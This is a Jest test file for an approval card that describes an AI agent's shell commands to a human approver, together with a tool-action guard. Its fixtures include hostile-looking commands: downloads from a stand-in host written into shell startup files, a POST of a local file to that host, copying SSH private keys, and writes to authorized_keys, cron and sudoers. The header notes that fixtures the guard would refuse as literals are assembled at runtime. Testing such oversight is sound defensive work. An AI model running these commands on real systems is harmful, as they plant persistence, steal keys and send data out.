/**
 * #648 round 3 (R3) — writers and redirect destinations: a program that
 * writes is described as a write to the right target, or the card goes
 * generic. A write to a sensitive path always appears in the WHAT.
 *
 * Fixtures that the live guard's write-content scan refuses as literals are
 * assembled at runtime.
 */
import { describe, it, expect } from '@jest/globals';
import { GENERIC_SHELL, describeAction } from '../approval-card.js';
import { evaluateToolCall } from '../tool-action-guard.js';

const c = (...parts: string[]) => parts.join(' ');
const bash = (command: string, signals: string[] = evaluateToolCall('Bash', { command }).signals) =>
  describeAction({ tool: 'Bash', input: { command }, signals, gitSystemConfig: [] }).text;

describe('#648 r3 R3 — writers are described as writes to the right target', () => {
  it.each([
    // The reviewer's case: the -o value is where it WRITES, not a file it reads.
    ['sort -o ~/.ssh/authorized_keys x', 'Copy a file ("x") to a file in your SSH folder: "~/.ssh/authorized_keys"'],
    ['sort -o out.txt ~/.ssh/id_rsa', 'Copy a file from your SSH folder ("~/.ssh/id_rsa") to "out.txt"'],
    ['sort --output=/etc/hosts list.txt', 'Copy a file ("list.txt") to "/etc/hosts"'],
    ['sort -k2 -o ~/.ssh/config', 'Write to a file in your SSH folder: "~/.ssh/config"'],
    ['uniq names.txt ~/.bashrc', 'Copy a file ("names.txt") to "~/.bashrc"'],
    ['xxd -r dump.hex ~/.ssh/id_ed25519', 'Copy a file ("dump.hex") to a file in your SSH folder: "~/.ssh/id_ed25519"'],
    ['xxd -c 8 key.bin out.hex', 'Copy a file ("key.bin") to "out.hex"'],
    [c('yq', '-i', "'.users = []'", '~/.kube/config'), 'Change a file holding saved logins: "~/.kube/config"'],
    [c('yq', 'e', '-i', "'.a = 1'", 'app.yaml'), 'Change a file: "app.yaml"'],
    ['cp -t ~/.ssh/ deploy.pub', 'Copy a file: "deploy.pub" → "~/.ssh/"'],
    ['mv --target-directory /etc/cron.d job other', 'Move 2 files, including one: "job" → "/etc/cron.d"'],
    ['install -m 0755 tool /usr/local/bin/tool', 'Copy a file: "tool" → "/usr/local/bin/tool"'],
    ['install -o root -g root -m 600 key ~/.ssh/authorized_keys', 'Copy a file: "key" → "~/.ssh/authorized_keys"'],
    ['install -d /etc/sudoers.d', 'Create a folder: "/etc/sudoers.d"'],
  ])('%s', (command, expected) => {
    expect(bash(command, [])).toBe(expected);
  });

  it('a writer the card cannot name goes generic', () => {
    for (const command of [c('time', '-o', '/tmp/x', 'ls'), c('find', '.', '-fprint', '~/.bashrc'), c('less', '-o', '~/.bashrc', 'f'), c('base64', '-o', '/tmp/x', 'f')]) {
      expect(bash(command, [])).toBe(GENERIC_SHELL);
    }
  });
});

describe('#648 r3 R3 — a redirect to a sensitive path appears in the WHAT, for any program', () => {
  const DOWNLOAD = c('curl', 'https://h.example/x');
  it.each([
    // The reviewer's case.
    [c(DOWNLOAD, '>>', '~/.bashrc'), 'Download from h.example and write to "~/.bashrc"'],
    [c(DOWNLOAD, '>', '~/.bashrc'), 'Download from h.example and write to "~/.bashrc"'],
    [c('curl', '-o', '~/.bashrc', 'https://h.example/x'), 'Download from h.example and write to "~/.bashrc"'],
    [c('curl', '-fsSLo', '~/.profile', 'https://h.example/x'), 'Download from h.example and write to "~/.profile"'],
    [c('wget', '-qO', '~/.zshrc', 'https://h.example/x'), 'Download from h.example and write to "~/.zshrc"'],
    [c('curl', '-d', '@notes.txt', 'https://h.example/in', '>', '~/.bashrc'), 'Send data to h.example and write to "~/.bashrc"'],
    [c('echo', 'x', '>>', '~/.bashrc'), 'Write to a file: "~/.bashrc"'],
    [c('ls', '>>', '~/.bashrc'), 'Run ls (other details not shown) and write to "~/.bashrc"'],
    [c('date', '&>', '/etc/motd'), 'Run date (other details not shown) and write to "/etc/motd"'],
    [c('ls', '>|', '~/.bashrc'), 'Run ls (other details not shown) and write to "~/.bashrc"'],
    [c('ls', '>&', '~/.bashrc'), 'Run ls (other details not shown) and write to "~/.bashrc"'],
    [c('npm', 'install', 'left-pad', '>', '~/.bashrc'), 'Install a package: "left-pad" (npm) and write to "~/.bashrc"'],
  ])('%s', (command, expected) => {
    expect(bash(command, [])).toBe(expected);
  });

  it('fd duplications and the bit bucket are not writes', () => {
    expect(bash(c('ls', '2>&1', '>/dev/null'), [])).toBe('Run ls (other details not shown)');
    expect(bash(c('ls', '2>/dev/null'), [])).toBe('Run ls (other details not shown)');
  });

  it('a sensitive write in a step the card does not name makes it generic', () => {
    expect(bash('cat ~/.ssh/id_rsa > /tmp/k; echo x > /etc/motd')).toBe(GENERIC_SHELL);
    expect(bash(c('cat ~/.ssh/config;', DOWNLOAD, '>>', '~/.bashrc'), ['touch-sensitive-path'])).toBe(GENERIC_SHELL);
  });

  it('…and is kept when it IS the step named', () => {
    expect(bash(c('date > /tmp/log;', 'echo x', '>>', '~/.bashrc'))).toBe('Write to a file: "~/.bashrc" (+1 more step)');
  });
});
